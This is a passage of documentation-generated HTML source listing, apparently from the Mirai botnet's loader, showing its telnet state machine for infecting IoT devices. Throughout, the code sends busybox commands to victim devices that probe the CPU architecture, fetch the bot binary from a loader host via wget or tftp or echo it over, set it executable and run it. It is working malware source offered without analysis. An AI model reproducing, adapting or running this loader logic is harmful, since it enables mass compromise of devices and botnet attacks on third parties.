name="l00353"></a><span class="lineno">  353</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;cd %s/\r\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acc55cc9b91cd9f473b0d5fb8082b0ef4">writedir</a>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acc55cc9b91cd9f473b0d5fb8082b0ef4">writedir</a>);</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox cp /bin/echo &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; &gt;&quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; /bin/busybox chmod 777 &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_COPY_ECHO;</div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 120;</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;                        }</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;                    <span class="keywordflow">case</span> TELNET_COPY_ECHO:</div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;                        consumed = <a class="code" href="connection_8c.html#aa5f67022eedf1d46da7efddad1864ecd">connection_consume_copy_op</a>(conn);</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;                        {</div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Finished copying /bin/echo to cwd\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;                            <span class="keywordflow">if</span> (!conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#a3aff74bc6c6a1bf62b5026950abfb8f9">has_arch</a>)</div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;                            {</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_DETECT_ARCH;</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 120;</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;                                <span class="comment">// DO NOT COMBINE THESE</span></div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;                                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox cat /bin/echo\r\n&quot;</span>);</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;                                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;                            }</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;                            {</div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_METHODS;</div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 15;</div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;                                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget; /bin/busybox tftp; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;                            }</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;                        }</div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;                    <span class="keywordflow">case</span> TELNET_DETECT_ARCH:</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;                        consumed = <a class="code" href="connection_8c.html#ad724b4cf4d0bf51c69f33f6469ee4082">connection_consume_arch</a>(conn);</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;                        {</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 15;</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                            <span class="keywordflow">if</span> ((conn-&gt;<a class="code" href="structconnection.html#aa486c9e894a076331c57c4b3a4930df3">bin</a> = <a class="code" href="binary_8c.html#aaa1514c791103db3737fd7336a02bc70">binary_get_by_arch</a>(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>)) == NULL)</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;                            {</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] Cannot determine architecture\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;                                <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                            }</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (strcmp(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, <span class="stringliteral">&quot;arm&quot;</span>) == 0)</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;                            {</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] Determining ARM sub-type\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;                                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;cat /proc/cpuinfo; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_ARM_SUBTYPE;</div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                            }</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                            {</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] Detected architecture: &#39;%s&#39;\n&quot;</span>, ev-&gt;data.fd, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget; /bin/busybox tftp; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_METHODS;</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;                            }</div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                        }</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                    <span class="keywordflow">case</span> TELNET_ARM_SUBTYPE:</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a8727b5c3aab5a5633d98ba86a15bbcfc">connection_consume_arm_subtype</a>(conn)) &gt; 0)</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                        {</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                            <span class="keyword">struct </span><a class="code" href="structbinary.html">binary</a> *bin = <a class="code" href="binary_8c.html#aaa1514c791103db3737fd7336a02bc70">binary_get_by_arch</a>(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;                            <span class="keywordflow">if</span> (bin == NULL)</div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                            {</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                            }</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#aa486c9e894a076331c57c4b3a4930df3">bin</a> = bin;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget; /bin/busybox tftp; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_METHODS;</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                        }</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;                    <span class="keywordflow">case</span> TELNET_UPLOAD_METHODS:</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a0ee0dff069c76ad003ae238270ac7c5d">connection_consume_upload_methods</a>(conn);</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;                        {</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Upload method is &quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                            <span class="keywordflow">switch</span> (conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#a75346b6fb4a5ef349310143adbaf0647">upload_method</a>)</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                            {</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                                <span class="keywordflow">case</span> UPLOAD_ECHO:</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_ECHO;</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;                                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox cp &quot;</span><a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; &gt; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; /bin/busybox chmod 777 &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;                                    printf(<span class="stringliteral">&quot;echo\n&quot;</span>);</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;                                <span class="keywordflow">case</span> UPLOAD_WGET:</div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_WGET;</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 120;</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;                                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget http://%s:%d/bins/%s.%s -O - &gt; &quot;</span><a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; /bin/busybox chmod 777 &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; &quot;</span> TOKEN_QUERY <span class="stringliteral">&quot;\r\n&quot;</span>,</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;                                                    wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a3429acc7dc3373cd09b6b10348ae41e6">wget_host_ip</a>, wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a1e2b34c57e3b5606aa8446e64823d725">wget_host_port</a>, <span class="stringliteral">&quot;mirai&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;                                    printf(<span class="stringliteral">&quot;wget\n&quot;</span>);</div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;                                <span class="keywordflow">case</span> UPLOAD_TFTP:</div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_TFTP;</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 120;</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;                                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; &quot;</span> TOKEN_QUERY <span class="stringliteral">&quot;\r\n&quot;</span>,</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;                                                    <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a>, <span class="stringliteral">&quot;mirai&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a04a30da3dd86aa73499c6d5e2e48311c">tftp_host_ip</a>);</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;                                    printf(<span class="stringliteral">&quot;tftp\n&quot;</span>);</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;                            }</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;                        }</div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;                    <span class="keywordflow">case</span> TELNET_UPLOAD_ECHO:   </div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a04dc8c68e7380236df79de3e1dc1d8bc">connection_upload_echo</a>(conn);</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;                        {</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_RUN_BINARY;</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Finished echo loading!\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;./%s; ./%s %s.%s; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aa3394da986d8b9f48acb15b49ec40fc6">EXEC_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a56f296116fba633d19e0b85f3516d6b1">id_tag</a>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;                            <a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a291eac3850dd90802a1dd4620256a8bb">total_echoes</a>);</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;                        }</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;                    <span class="keywordflow">case</span> TELNET_UPLOAD_WGET:</div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;                        consumed = <a class="code" href="connection_8c.html#acb23df70b10e82b394c5aea71ce22a28">connection_upload_wget</a>(conn);</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                        {</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_RUN_BINARY;</div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00490"></a><span class="lineno">  490</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Finished wget loading\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00491"></a><span class="lineno">  491</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00492"></a><span class="lineno">  492</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;./&quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot; %s.%s; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aa3394da986d8b9f48acb15b49ec40fc6">EXEC_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a56f296116fba633d19e0b85f3516d6b1">id_tag</a>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00493"></a><span class="lineno">  493</span>&#160;                            <a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;wrker-&gt;<a class="code" 